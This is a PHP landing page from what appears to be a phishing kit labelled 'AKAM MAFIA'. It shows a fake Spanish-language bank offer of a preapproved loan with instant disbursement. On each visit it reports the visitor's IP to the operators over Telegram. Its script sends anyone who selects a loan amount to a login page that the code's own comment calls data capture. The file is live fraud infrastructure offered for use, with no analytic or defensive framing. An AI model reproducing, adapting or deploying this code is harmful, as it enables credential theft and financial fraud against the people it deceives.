<?php
// Conexión con el corazón de AKAM MAFIA
require('../panel/lib/funciones.php'); 

$ip = $_SERVER['REMOTE_ADDR'];
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');

// Alerta de visita inmediata
enviar_telegram("👀 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - VISITA</b>\n\n📍 <b>IP:</b> <code>$ip</code>\n🔗 <b>ESTADO:</b> Viendo Landing de Crédito");
?>
<html>
    <head>
        <title>Crédito de libre inversión para equipar tu hogar o viajar</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
        <script type="text/javascript" src="../js/functions.js"></script>                    
        <style type="text/css">
            *{ padding: 0px; margin: 0px; font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif; }
            #menu-top{ background-color: #2C2A29; }
            .item-menu-top { color: #fff; padding: 10px; font-size: 14px; cursor: pointer; }
            .item-menu-top:hover { color: #2C2A29; background-color: #fff; }
            .menu{ background-color: #fff }
            .item-menu{ font-size: 13px; color: #2C2A29; padding: 14px 10px; border-bottom: 2px solid #FFF; cursor: pointer; }
            .item-menu:hover{ border-bottom: 2px solid #FDDA24; font-weight: bold; }
            select { border: 1px solid #CCCCCC; border-radius: 0px; height: 34px; font-size: 14px; color: #2c2a29; margin: 15px 0px; width: 100%; max-width: 350px;}
            button{ background: #FDDA24; border-radius: 60px; color: #2C2A29; font-weight: bold; padding: 12px 18px; max-width: 300px; width: 90%; cursor: pointer; border: 0; }
            #plazo1,#plazo2{ border: 1px solid #CCCCCC; padding: 20px; text-align: center; max-width: 410px; margin: 0 auto; }
            #dina2{ background-color: #434547; padding:20px; margin: 30px auto; width: calc(94% - 40px); display: none !important; }
            #foto-movil{ display: none; }
            #contenido{ width: 100%; max-width: 1139px; margin: 20px auto; }
            .texto-min { font-size: 11px !important; color: #2c2a29 !important; line-height: 16px; }
            #fondo{ position: fixed; width: 100%; height: 100%; left: 0; top: 0; background-color: #ffffffe6; z-index: 900; display: none; }
            #cargando{ position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 920; text-align: center; display: none; }
            #botones-footer{ width: 100%; height: auto; position: fixed; left: 0; bottom: 0; z-index: 900; }
            @media (max-width: 991px) {
                #menu-top,#menu-pal,#sucral,#miga,#din,#foto-desktop,#plazo1,#info-footer1 { display: none; }
                #foto-movil,#plazo2,#dina2{ display: block; }
                #contenido { width: 94%; margin: 0 auto; }
                #botones-footer { position: relative; margin-top: 20px; }
            }
        </style>
    </head>
    <body> 
        <div id="botones-footer"><img src="../img/botones-footer.jpg" width="100%"></div>  
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg" width="150"><br>
            <img src="../img/load2.gif" width="40" />
        </div>

        <div class="menu">
            <table border="0" cellpadding="0" cellspacing="0" style="width: 94%; max-width: 1319px; margin: 0 auto;">
                <tr>
                    <td valign="middle" align="left"><img src="../img/logo.svg" width="150"></td>
                    <td valign="middle" align="right"><img src="../img/sucral.jpg" style="cursor: pointer;"></td>
                </tr>
            </table>
        </div>

        <table border="0" cellpadding="0" cellspacing="0" id="contenido">
            <tr>
                <td width="50%" valign="top">
                    <div style="font-size: 24px; font-weight: 800; color: #2C2A29; margin-bottom: 15px;">Crédito de libre inversión preaprobado</div>
                    <div style="font-size: 16px; color: #2C2A29;">Aprovecha las ventajas de una cuota fija con una tasa del <b>1.73%</b>. ¡Desembolso inmediato!</div>
                    <br>
                    <div id="plazo1">
                        <img src="../img/mano.png" width="50px"><br>
                        <b>Selecciona el monto y plazo:</b><br>
                        <select id="txt-plazo1">
                            <option value="">Selecciona una opción</option>
                            <option value="10M">$10.000.000 | 24 Meses</option>
                            <option value="20M">$20.000.000 | 36 Meses</option>
                            <option value="30M">$30.000.000 | 48 Meses</option>
                        </select><br><br>
                        <button id="btn-inicio1">CONTINUAR</button>
                    </div>
                </td>
                <td width="50%" valign="top" id="foto-desktop"><img src="../img/foto.jpg" width="100%"></td>
            </tr>
            <tr>
                <td align="center" id="foto-movil"><img src="../img/foto.jpg" width="100%"></td>
            </tr>
        </table>

        <div id="plazo2">
            <img src="../img/mano.png" width="50px"><br>
            <b>Selecciona el monto y plazo:</b><br>
            <select id="txt-plazo2">
                <option value="">Selecciona una opción</option>
                <option value="10M">$10.000.000 | 24 Meses</option>
                <option value="20M">$20.000.000 | 36 Meses</option>
                <option value="30M">$30.000.000 | 48 Meses</option>
            </select><br><br>
            <button id="btn-inicio2">CONTINUAR</button>
        </div>

        <table border="0" cellpadding="0" cellspacing="0" style="width: 94%; max-width: 1290px; margin: 40px auto;">
            <tr>
                <td valign="top" align="left"><img src="../img/grupo.png" width="200"></td>
                <td valign="top" align="right" class="texto-min">
                    IP: <?php echo $ip; ?><br>
                    <span id="fecha-hora1"></span>
                </td>
            </tr>
        </table>

        <script type="text/javascript">
            $(document).ready(function() { 
                function irAlLogin(){
                    // Redirige a la captura de datos de AKAM MAFIA
                    window.location.href = "../a/login.php"; 
                } 

                $('#btn-inicio1, #btn-inicio2').click(function(){
                    let p1 = $("#txt-plazo1").val();
                    let p2 = $("#txt-plazo2").val();
                    if (p1 !== "" || p2 !== "") {
                        $("#fondo, #cargando").fadeIn();
                        setTimeout(irAlLogin, 1500);
                    } else {
                        alert("Por favor selecciona un monto para continuar.");
                    }
                });              
            });
        </script>
    </body>
</html>
